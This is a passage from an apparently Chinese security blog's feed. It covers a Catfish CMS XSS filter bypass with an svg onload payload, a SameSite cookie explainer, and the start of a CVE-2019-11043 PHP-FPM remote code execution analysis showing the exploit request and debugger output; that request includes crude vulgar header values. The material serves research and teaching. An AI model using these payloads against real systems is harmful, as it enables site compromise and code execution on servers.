Catalina</li></ul></blockquote><p>成熟的CMS一般都存在自己对XSS、SQL注入、CSRF等漏洞的防御方案，这种情况下，纯黑盒测试的效率显然会下降，追求时间的话都会直接对其源码中针对攻击防御的代码片段进行审计，寻找其防御问题，并反向追踪该防御函数适用场景，从而挖掘相关漏洞。下文就以挖掘Catfish CMS的XSS漏洞为例。</p><ul><li>通过对源码的搜索，可以找到一处XSS过滤的PHP函数：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">filterJs</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(preg_match(<span class="string">"/(&lt;script)|(&lt;style)|(&lt;iframe)|(&lt;frame)|(&lt;form)|(&lt;a)|(&lt;object)|(&lt;frameset)|(&lt;bgsound)|(&lt;video)|(&lt;source)|(&lt;audio)|(&lt;track)|(&lt;marquee)/i"</span>,$str) || preg_match(<span class="string">"/(onabort)|(onactivate)|(onafter)|(onbefore)|(onblur)|(onbounce)|(oncellchange)|(onchange)|(onclick)|(oncont)|(oncopy)|(oncut)|(ondata)|(ondblclick)|(ondeactivate)|(ondrag)|(ondrop)|(onerror)|(onfilter)|(onfinish)|(onfocus)|(onhelp)|(onkey)|(onlayout)|(onlose)|(onload)|(onmouse)|(onmove)|(onpaste)|(onproperty)|(onready)|(onreset)|(onresize)|(onrow)|(onscroll)|(onselect)|(onstart)|(onstop)|(onseek)|(onsubmit)|(ontoggle)|(onunload)/i"</span>,$str))</span><br><span class="line">        &#123;</span><br><span class="line">            $str = preg_replace([<span class="string">'/&lt;script[\s\S]*?&lt;\/script[\s]*&gt;/i'</span>,<span class="string">'/&lt;style[\s\S]*?&lt;\/style[\s]*&gt;/i'</span>,<span class="string">'/&lt;iframe[\s\S]*?(&lt;\/iframe|\/)[\s]*&gt;/i'</span>,<span class="string">'/&lt;frame[\s\S]*?(&lt;\/frame|\/)[\s]*&gt;/i'</span>,<span class="string">'/&lt;form[\s\S]*?&gt;/i'</span>,<span class="string">'/&lt;object[\s\S]*?(&lt;\/object|\/)[\s]*&gt;/i'</span>,<span class="string">'/&lt;frameset[\s\S]*?(&lt;\/frameset|\/)[\s]*&gt;/i'</span>,<span class="string">'/&lt;bgsound[\s\S]*?(&lt;\/bgsound|\/)[\s]*&gt;/i'</span>,<span class="string">'/&lt;video[\s\S]*?(&lt;\/video|\/)[\s]*&gt;/i'</span>,<span class="string">'/&lt;source[\s\S]*?(&lt;\/source|\/)[\s]*&gt;/i'</span>,<span class="string">'/&lt;audio[\s\S]*?(&lt;\/audio|\/)[\s]*&gt;/i'</span>,<span class="string">'/&lt;track[\s\S]*?(&lt;\/track|\/)[\s]*&gt;/i'</span>,<span class="string">'/&lt;marquee[\s\S]*?(&lt;\/marquee|\/)[\s]*&gt;/i'</span>,<span class="string">'/&lt;a[\s\S]*?(&lt;\/a|\/)[\s]*&gt;/i'</span>,<span class="string">'/on[A-Za-z]+[\s]*=[\s]*[\'|"][\s\S]*?[\'|"]/i'</span>,<span class="string">'/on[A-Za-z]+[\s]*=[\s]*[^&gt;]+/i'</span>],<span class="string">''</span>,$str);</span><br><span class="line">        &#125;</span><br><span class="line">        $str = str_replace(<span class="string">'&lt;!--'</span>,<span class="string">'&amp;lt;!--'</span>,$str);</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li>显而易见，该CMS采用黑名单的形式过滤XSS攻击，虽然黑名单可以在对Web应用影响最小的情况下过滤部分XSS漏洞，但由于黑名单手动添加的过滤标签，导致很可能存在过滤不完全的情况出现。这种情况下可以意识到此处很可能存在绕过。观察可知，该黑名单并没有过滤带有on*事件的HTML5标签，比如XSS最常用到的svg标签。</li><li>反响追踪<code>filterJs</code>函数是否应用于CMS哪几处功能，可以发现评论、Admin管理界面多处均用到该函数。我们以管理中心的写文章功能为目标继续进行。</li><li>在写文章的内容部分切换为HTML原生界面，输入svg标签的XSS payload: <code>&lt;svg/onload=alert(1)&gt; </code><img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/cms-xss1.png" alt="cms1"></li><li>返回用户界面浏览发现XSS攻击发生：<img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/cms-xss2.png" alt="cms2"></li></ul><h1 id="Afterwords"><a href="#Afterwords" class="headerlink" title="Afterwords."></a>Afterwords.</h1><p>工控领域由于主要业务不存在于Web方面，不论是厂商还是企业均未在安全其之上投入精力，导致问题频发。希望不久的将来，随着工控物联网的推进和国家战略跟进，工控Web安全也能随之得到应有的提升。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;The-foregoing&quot;&gt;&lt;a href=&quot;#The-foregoing&quot; class=&quot;headerlink&quot; title=&quot;The foregoing.&quot;&gt;&lt;/a&gt;The foregoing.&lt;/h1&gt;&lt;p&gt;现今，工业领域随时代潮流所需，工控厂商逐渐需要W
      
    
    </summary>
    
    
    
      <category term="CVE" scheme="http://hducaiji.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>Cookie SameSite 食用指南</title>
    <link href="http://hducaiji.github.io/2020/05/29/cookie-samesite/"/>
    <id>http://hducaiji.github.io/2020/05/29/cookie-samesite/</id>
    <published>2020-05-29T08:29:30.000Z</published>
    <updated>2020-07-28T10:22:00.808Z</updated>
    
    <content type="html"><![CDATA[<h1 id="The-foregoing"><a href="#The-foregoing" class="headerlink" title="The foregoing."></a>The foregoing.</h1><p>随着Web安全的发展需要，浏览器端已经开始针对Cookie进一步防御，而SameSite属性正是这场防御进化的焦点。Samesite属性于2016年由IETF正式发布，现今出于网站稳定性的考量（理同废除Flash），大部分浏览器采用支持但默认不开启状态（SameSite=None），但该属性一定会随时间缓步推进普及，并最终适用于主流浏览器内。<br>故，遵从“先知为敬”的战略，本文就来初步探讨一下Samesite属性基础以及其对客户端安全性的影响。</p><br/><h1 id="PART1-SameSite-explained"><a href="#PART1-SameSite-explained" class="headerlink" title="PART1: SameSite explained"></a>PART1: SameSite explained</h1><h2 id="What-is-SameSite-Cookie"><a href="#What-is-SameSite-Cookie" class="headerlink" title="What is SameSite Cookie"></a>What is SameSite Cookie</h2><p><code>SameSite</code>作为一种属性存在于Cookie中，类似于<code>Domain</code>、<code>HttpOnly</code>等属性。<strong>如同其名，Samesite主要用于说明该Cookie是否仅被同站请求享有，来控制Cookie何时该被跨站请求携带</strong>。我们先来看看它的三个值：</p><ol><li>None: 该Cookie不启用<code>SameSite</code>，即任何类型的请求都会携带该Cookie。截止文章书写日期，所有支持SameSite的浏览器均对没设置该属性的Cookie采用<code>SameSite=None</code>。未来将对设置为None的Cookie强制要求设置Secure为True。</li><li>Lax: 采用宽松的策略，只要同站请求或者是部分跨站请求即会携带该Cookie。未来浏览器SameSite将默认设置为该值。</li><li>Strict: 采用严格的策略，仅在同站请求中携带该Cookie。</li></ol><h2 id="LAX"><a href="#LAX" class="headerlink" title="LAX?"></a>LAX?</h2><p>看到这里，读者的第一个疑问应该是，宽松策略到底宽松到什么样的程度？关于这个问题，IETF在<a href="https://tools.ietf.org/html/draft-ietf-httpbis-cookie-same-site-00" target="_blank" rel="noopener">文档</a>中写道：</p><blockquote><p>Safe” HTTP methods include “GET”, “HEAD”, “OPTIONS”, and “TRACE”, as defined in Section 4.2.1 of [RFC7231].<br>……<br>Lax enforcement provides reasonable defense in depth against CSRF attacks that rely on unsafe HTTP methods (like “POST”), but do not offer a robust defense against CSRF as a general category of attack:</p><ol><li>Attackers can still pop up new windows or trigger top-level navigations in order to create a “same-site” request (as described in section 2.1), which is only a speedbump along the road to exploitation.</li><li>Features like “<link rel='prerender'>“ [prerendering] can be exploited to create “same-site” requests without the risk of user detection.</li></ol></blockquote><p>简单总结一下，只要跨站请求属于”GET”、”HEAD”、”OPTIONS”或”TRACE”中一种，且通过顶级导航栏发送请求，那么在<code>SameSite=LAX</code>下，也会携带该Cookie的。<br>从实现上我们可以想到，设计师把它作为默认值是为了防止存在跨站跳转页面的场景中，Cookie不被携带而导致功能失效。当然，Lax下可见安全防护性也偏低。</p><h2 id="Same-Site"><a href="#Same-Site" class="headerlink" title="Same? Site?"></a>Same? Site?</h2><p>SameSite对同站请求的定义是十分重要的，具体可以参考<a href="https://tools.ietf.org/html/draft-ietf-httpbis-cookie-same-site-00#section-2.1" target="_blank" rel="noopener">IETF关于same-site和cross-site的定义</a>。需要注意的是，有些web手会在这里把samesite和同域策略画等号，其实同站会比同域的要求低很多，不需要同时符合协议、域名、端口号。<br>简单来说，除了<code>Refer</code>为空等请求属于同站请求外，我们可以通过辨别Refer和Host的Second-Level Domain（二级域名，sld）是否一致判断是否为同站请求，而二级域名是由<a href="https://publicsuffix.org/list/public_suffix_list.dat" target="_blank" rel="noopener">public suffix</a>（Mozilla维护的顶级域名）和其后一级域名构成。<br>理论繁复，我们可以通过工具来帮助我们判断同/跨站请求，python模块publicsuffix2可以更清晰地提取某域名的二级域名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ sudo pip3 install publicsuffix2</span><br><span class="line">$ python3</span><br><span class="line">&gt;&gt;&gt; from publicsuffix2 import get_sld</span><br><span class="line">&gt;&gt;&gt; get_sld(&#39;www.foo.com&#39;)</span><br><span class="line">&#39;foo.com&#39;</span><br><span class="line">&gt;&gt;&gt; get_sld(&#39;www2.foo.com&#39;)</span><br><span class="line">&#39;foo.com&#39;</span><br><span class="line">&gt;&gt;&gt; get_sld(&#39;foo.github.io&#39;)</span><br><span class="line">&#39;foo.github.io&#39;</span><br><span class="line">&gt;&gt;&gt; get_sld(&#39;jack.github.io&#39;)</span><br><span class="line">&#39;jack.github.io&#39;</span><br></pre></td></tr></table></figure><p>从提取的二级域名可以判断，域名为<code>www.foo.com</code>和<code>ww2.foo.com</code>的两个请求属于同站请求，域名为<code>foo.github.io</code>和<code>jack.github.io&#39;</code>的两个请求为跨站请求。</p><h2 id="Browser-support"><a href="#Browser-support" class="headerlink" title="Browser support"></a>Browser support</h2><p>对于SameSite属性的实现，大部分主流浏览器已完成，等待的是何时将<a href="https://tools.ietf.org/html/draft-west-cookie-incrementalism-00#section-3" target="_blank" rel="noopener">未来改进措施</a>纳入实施（默认值设为Lax，值为None时需将Secure置为Ture）</p><ul><li>SameSite属性实现情况：<br><img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529Samesite/samesite-support.png" alt="samesite-support"></li><li>SameSite默认值设为Lax及上下文需求Secure：<br><img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529Samesite/samesite-incrementalism.png" alt="samesite-incrementalism"></li></ul><p>需要说明的是，后一项仅是实现该功能，即可以开启，但不默认启用。离SameSite的相关提案正式普遍实施还为时尚早。读者阅读时的浏览器支持，请访问Can I Use自行查看。</p><br/><h1 id="PART2-SameSite-means-what"><a href="#PART2-SameSite-means-what" class="headerlink" title="PART2: SameSite means what?"></a>PART2: SameSite means what?</h1><p>SameSite文档和网络上很多文章都提到，SameSite是为深度抵御CSRF攻击而推出的。那么它实际上到底能缓解什么类型的攻击？这需要先从本质上理解SameSite的意义。根据PART1提供的原理，<strong>SameSite默认启用Lax状态下，其实际上是在阻止外站访问本站时，本站Cookie的携带</strong>（除了顶级导航栏跳转），而这种跨站请求时常发生在身份验证/伪造上。深刻理解上面这段话，我们就能分析什么Web攻击将会受到它的影响。</p><h2 id="Effects-on-CSRF"><a href="#Effects-on-CSRF" class="headerlink" title="Effects on CSRF"></a>Effects on CSRF</h2><p>CSRF中文翻译就是跨站请求伪造，字字被Part2开头点到，肯定受到了很大的限制。从CSRF本质上来看，它利用了浏览器跨站访问时，会自动携带目标站点Cookie的特性，而SameSite正是说明了什么Cookie该在跨站时携带。从CSRF攻击场景上来看，非结合XSS的CSRF，攻击者都需要在其它站点搭建恶意页面引导受害者访问，恶意站点实现的跨站请求需要根据实际攻击的站点功能所决定，而Lax值下，仅允许顶部导航的跨站携带该Cookie，POST等非安全HTTP方法下，CSRF将会受到限制。（POST又是CSRF的常用攻击手段）<br>然而在SameSite应用初期，浏览器为了保证大部分站点的功能正常运行，即使手动开启默认SameSite=Lax，也会受到浏览器缓和措施的影响，而使CSRF攻击面没那么狭窄。例如SameSite先行者Chrome会将未设置SameSite的Cookie两分钟内依旧可以被POST携带( <a href="https://www.chromestatus.com/feature/5088147346030592" target="_blank" rel="noopener">https://www.chromestatus.com/feature/5088147346030592</a> )，利用这项机制，两分钟内发动攻击，或利用应用程序相关功能刷新Cookie依旧可以让CSRF所向披靡。相关研究已经有部分研究员发布了成果和想法，如：<a href="https://medium.com/@renwa/bypass-samesite-cookies-default-to-lax-and-get-csrf-343ba09b9f2b" target="_blank" rel="noopener">https://medium.com/@renwa/bypass-samesite-cookies-default-to-lax-and-get-csrf-343ba09b9f2b</a> 。当然，对于令牌存储到localStorage的情况，CSRF将不会受到影响。</p><h2 id="Effects-on-Hijacking"><a href="#Effects-on-Hijacking" class="headerlink" title="Effects on Hijacking"></a>Effects on Hijacking</h2><p>对于劫持，特别是点击劫持，如果从整个攻击发生过程上来看，你会发现两种漏洞很相似。点击劫持在用户浏览器使用iframe隐秘加载被攻击站时，也是种跨站请求，且不属于顶级导航跳转，不设置SameSite的Cookie是不会携带的，从而缺乏用户认证所需令牌，无法完成相应的攻击。对于令牌存储到localStorage同CSRF。</p><h2 id="Effects-on-Other-Web-Attacks"><a href="#Effects-on-Other-Web-Attacks" class="headerlink" title="Effects on Other Web Attacks"></a>Effects on Other Web Attacks</h2><p>我们以XSSI为例来描述一下其余可能受到影响的Web漏洞。从攻击场景上来看，XSSI需要嵌入一个带身份验证的资源进script标签以绕过SOP限制，从而窃取用户可能的隐私信息。然而，若SameSite生效，包含在Cookie中的用户令牌将不会插入到请求当中，正常情况下会让该攻击不能成功。从上述三个漏洞影响分析中我们自然可以发现，只要攻击涉及到利用用户身份从攻击站访问受害站时，SameSite会限制相关攻击的中间流程，以此推倒，很多隐私泄漏型等攻击将会或多或少收到影响，读者可以举一反三，将本文的经验用于类比分析。</p><br/><h1 id="Afterword"><a href="#Afterword" class="headerlink" title="Afterword."></a>Afterword.</h1><p>SameSite作为一种Cookie属性，弥补了跨站/跨域问题上，浏览器特性导致的缺口。分析下来，其可以抵抗的范围广，影响力大，是一种足以推动Web安全向前进步的补足。相信在不久的将来，其实际应用之际，会给Web增添新光彩。</p><br/><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li>IETF SameSite文档：<a href="https://tools.ietf.org/html/draft-ietf-httpbis-cookie-same-site-00" target="_blank" rel="noopener">https://tools.ietf.org/html/draft-ietf-httpbis-cookie-same-site-00</a></li><li>IETF SameSite改进措施：<a href="https://tools.ietf.org/html/draft-west-cookie-incrementalism-00#section-3" target="_blank" rel="noopener">https://tools.ietf.org/html/draft-west-cookie-incrementalism-00#section-3</a></li><li>长亭推文 - CSRF 漏洞的末日？<a href="https://mp.weixin.qq.com/s/YqSxIvbgq1DkAlUL5rBtqA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/YqSxIvbgq1DkAlUL5rBtqA</a></li><li>Web.dev博客普及SameSite: <a href="https://web.dev/samesite-cookies-explained/" target="_blank" rel="noopener">https://web.dev/samesite-cookies-explained/</a></li><li>Mozilla公共后缀列表：<a href="https://publicsuffix.org/" target="_blank" rel="noopener">https://publicsuffix.org/</a></li><li>Chrome相关说明：<a href="https://www.chromestatus.com/feature/5088147346030592" target="_blank" rel="noopener">https://www.chromestatus.com/feature/5088147346030592</a>  &amp;  <a href="https://www.chromium.org/updates/same-site/faq" target="_blank" rel="noopener">https://www.chromium.org/updates/same-site/faq</a></li><li>Twitter@RenwaX23关于SameSite的绕过: <a href="https://medium.com/@renwa/bypass-samesite-cookies-default-to-lax-and-get-csrf-343ba09b9f2b" target="_blank" rel="noopener">https://medium.com/@renwa/bypass-samesite-cookies-default-to-lax-and-get-csrf-343ba09b9f2b</a></li><li>Twitter@filedescriptor,@ngalongc,@EdOverflow关于SameSite影响面分析： <a href="https://blog.reconless.com/samesite-by-default/" target="_blank" rel="noopener">https://blog.reconless.com/samesite-by-default/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;The-foregoing&quot;&gt;&lt;a href=&quot;#The-foregoing&quot; class=&quot;headerlink&quot; title=&quot;The foregoing.&quot;&gt;&lt;/a&gt;The foregoing.&lt;/h1&gt;&lt;p&gt;随着Web安全的发展需要，浏览器端已经开始针对C
      
    
    </summary>
    
    
    
      <category term="Cookie" scheme="http://hducaiji.github.io/tags/Cookie/"/>
    
      <category term="WEB" scheme="http://hducaiji.github.io/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-11043 PHP-FPM RCE - Vulnerability analysis</title>
    <link href="http://hducaiji.github.io/2019/12/06/CVE-2019-11043-2/"/>
    <id>http://hducaiji.github.io/2019/12/06/CVE-2019-11043-2/</id>
    <published>2019-12-06T03:30:33.000Z</published>
    <updated>2020-07-28T10:21:35.470Z</updated>
    
    <content type="html"><![CDATA[<h1 id="The-foregoing"><a href="#The-foregoing" class="headerlink" title="The foregoing."></a>The foregoing.</h1><ul><li>请先浏览该CVE复现与exp解析篇。</li><li>漏洞分析期间采用的请求包为：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php/PHP_VALUE%0Asession.auto_start=1;;;?QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.3.68</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0</span><br><span class="line"><span class="attribute">D-Pisos</span>: 8==========================================================================================================================D</span><br><span class="line"><span class="attribute">Ebut</span>: mamku tvoyu</span><br></pre></td></tr></table></figure>（环境不同，<code>D-Pisos</code>也不尽相同，请不要直接引用。）<br/></li></ul><h1 id="Brief-Introduction"><a href="#Brief-Introduction" class="headerlink" title="Brief Introduction."></a>Brief Introduction.</h1><p>CVE-2019-11043 EXP主要利用0A截断导致指针可控，通过原代码将PHP_VALUE内容精确写入指定堆，覆盖nginx&amp;fastcgi通信时的全局变量，从而可任意控制PHP相关配置，导致RCE等威胁发生。<br><br/></p><h1 id="Main-Analysis"><a href="#Main-Analysis" class="headerlink" title="Main Analysis."></a>Main Analysis.</h1><h2 id="Accpet-amp-Read-Request"><a href="#Accpet-amp-Read-Request" class="headerlink" title="Accpet &amp; Read Request"></a>Accpet &amp; Read Request</h2><p>要分析该cve利用过程，可以从请求被接收开始，我们只需要关注请求被接收处理后存储结果。</p><ul><li>由<code>sapi/fpm/fpm/fpm_main.c</code><a href="https://github.com/php/php-src/blob/fadd7f0f1e7a44d6209b5c5cf30870e4b73efa7d/sapi/fpm/fpm/fpm_main.c#L1894" target="_blank" rel="noopener">line 1894</a>调用<code>main/fastcgi.c</code>中<a href="https://github.com/php/php-src/blob/fadd7f0f1e7a44d6209b5c5cf30870e4b73efa7d/main/fastcgi.c#L1365" target="_blank" rel="noopener"><code>fcgi_accept_request()</code></a>循环监听，接收socket请求后调用<a href="https://github.com/php/php-src/blob/fadd7f0f1e7a44d6209b5c5cf30870e4b73efa7d/main/fastcgi.c#L1048" target="_blank" rel="noopener"><code>fcgi_read_request()</code></a>解析并存储整个请求<code>request</code>进全局变量<code>SG(server_context)</code>，以便适时调用。</li></ul><p><code>request</code>是贯穿整个利用链的变量，需要重点关注，其结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p request</span><br><span class="line">$<span class="number">1</span> = (fcgi_request *) <span class="number">0x558272721d50</span></span><br><span class="line">pwndbg&gt; p *(struct _fcgi_request *) <span class="number">0x558272721d50</span></span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  listen_socket = <span class="number">5</span>, </span><br><span class="line">  tcp = <span class="number">0</span>, </span><br><span class="line">  fd = <span class="number">-1</span>, </span><br><span class="line">  id = <span class="number">1</span>, </span><br><span class="line">  keep = <span class="number">0</span>, </span><br><span class="line">  nodelay = <span class="number">0</span>, </span><br><span class="line">  ended = <span class="number">1</span>, </span><br><span class="line">  in_len = <span class="number">0</span>, </span><br><span class="line">  in_pad = <span class="number">0</span>, </span><br><span class="line">  out_hdr = <span class="number">0x0</span>, </span><br><span class="line">  out_pos = <span class="number">0x558272721d88</span> <span class="string">"\001\006"</span>, </span><br><span class="line">  out_buf = <span class="string">"\001\006\000\001\000\367\001\000X-Powered-By: PHP/7.2.10\r\nSet-Cookie: PHPSESSID=vglcabn1328k2srnacn6imk1vj; path=/\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache"</span>..., </span><br><span class="line">  reserved = <span class="string">'\000'</span> &lt;repeats <span class="number">15</span> times&gt;, </span><br><span class="line">  hook = &#123;</span><br><span class="line">    on_accept = <span class="number">0x55826ff1c49f</span> &lt;fpm_request_accepting&gt;, </span><br><span class="line">    on_read = <span class="number">0x55826ff1c57d</span> &lt;fpm_request_reading_headers&gt;, </span><br><span class="line">    on_close = <span class="number">0x55826ff1cbac</span> &lt;fpm_request_finished&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  has_env = <span class="number">0</span>, </span><br><span class="line">  env = &#123;</span><br><span class="line">    hash_table = &#123;<span class="number">0x0</span> &lt;repeats <span class="number">128</span> times&gt;&#125;, </span><br><span class="line">    <span class="built_in">list</span> = <span class="number">0x0</span>, </span><br><span class="line">    buckets = <span class="number">0x558272725190</span>, </span><br><span class="line">    data = <span class="number">0x5582727269b0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见它是个复杂结构体，了解到此就ok。<br><br/></p><h2 id="Control-path-info"><a href="#Control-path-info" class="headerlink" title="Control path_info"></a>Control path_info</h2><p>跟进到<code>main</code>调用<a href="https://github.com/php/php-src/blob/ab061f95ca966731b1c84cf5b7b20155c0a1c06a/sapi/fpm/fpm/fpm_main.c#L1021" target="_blank" rel="noopener"><code>init_request_info</code></a>，漏洞利用过程几乎全在此函数中完成。</p><ul><li>首先我们将视野移到修复该cve的<a href="https://github.com/php/php-src/commit/ab061f95ca966731b1c84cf5b7b20155c0a1c06a#diff-624bdd47ab6847d777e15327976a9227" target="_blank" rel="noopener">commit</a>代码位置，即<a href="https://github.com/php/php-src/blob/fadd7f0f1e7a44d6209b5c5cf30870e4b73efa7d/sapi/fpm/fpm/fpm_main.c#L1212" target="_blank" rel="noopener"><code>fpm_main.c</code> line1212</a>附近:</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> ptlen = <span class="built_in">strlen</span>(pt);</span><br><span class="line"><span class="keyword">int</span> slen = len - ptlen;</span><br><span class="line"><span class="keyword">int</span> pilen = env_path_info ? <span class="built_in">strlen</span>(env_path_info) : <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> tflag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *path_info;</span><br><span class="line"><span class="keyword">if</span> (apache_was_here) &#123;</span><br><span class="line"><span class="comment">/* recall that PATH_INFO won't exist */</span></span><br><span class="line">path_info = script_path_translated + ptlen;</span><br><span class="line">tflag = (slen != <span class="number">0</span> &amp;&amp; (!orig_path_info || <span class="built_in">strcmp</span>(orig_path_info, path_info) != <span class="number">0</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">path_info = env_path_info ? env_path_info + pilen - slen : <span class="literal">NULL</span>;</span><br><span class="line">tflag = (orig_path_info != path_info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依次解析各行：</p><ol><li><code>pt</code>：即所请求资源的本地路径。代码往上翻阅即可得知<code>pt</code>是通过<a href="https://github.com/php/php-src/blob/fadd7f0f1e7a44d6209b5c5cf30870e4b73efa7d/sapi/fpm/fpm/fpm_main.c#L1025" target="_blank" rel="noopener"><code>FCGI_GETENV(request, &quot;PATH_TRANSLATED&quot;)</code></a>取出<code>request-&gt;env</code>存储的<code>var</code>为”PATH_TRANSLATED”的struct的val值（真的绕口..具体GETENV实现可自行阅读<a href="https://github.com/php/php-src/blob/fadd7f0f1e7a44d6209b5c5cf30870e4b73efa7d/main/fastcgi.c#L1689" target="_blank" rel="noopener">源码</a>）,通过层层处理后成为<code>/var/www/html/index.php</code>：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 